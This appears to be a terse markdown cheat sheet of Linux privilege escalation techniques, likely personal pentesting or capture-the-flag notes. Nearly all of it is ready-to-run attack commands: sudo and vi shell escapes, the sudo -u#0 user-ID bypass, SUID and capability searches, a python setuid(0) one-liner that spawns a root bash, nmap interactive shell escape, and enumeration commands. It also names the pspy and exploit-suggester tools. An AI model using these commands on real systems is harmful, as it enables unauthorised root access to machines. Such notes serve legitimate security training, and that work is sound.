
# Privilege Escalation

## Linux
* Run auto escalation checkers in the scripts folder
  * Mike_Czumak.py <--- python2 required
  * linuxExploitSuggester.sh

* Abuse commands allowed to run as root
  * These commands can be found in sudoers files
  * $> sudo -u#0 vi anything
  * :!sh
  * find / -type f -perm /4000 2>/dev/null

* getcap -r / 2>/dev/null
  * /usr/bin/python* -c 'import os; os.setuid(0);os.system("/bin/bash");'

* nmap
  * $> sudo nmap --interactive
  * !bash

* find / type -f /4000

## Cron Jobs
* https://github.com/DominicBreuker/pspy

# getting basic knowledge
cat /etc/os-release


| Description | Link |
| ------------- | ----- |
| abuse sudo command | https://null-byte.wonderhowto.com/how-to/abuse-vulnerable-sudo-versions-get-root-0212024/ |


# Simple Linux Enum
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null
cat /etc/os-release 2>/dev/null

echo $PATH

* run scripts.  Look specifically for programs that can do things like set the uid

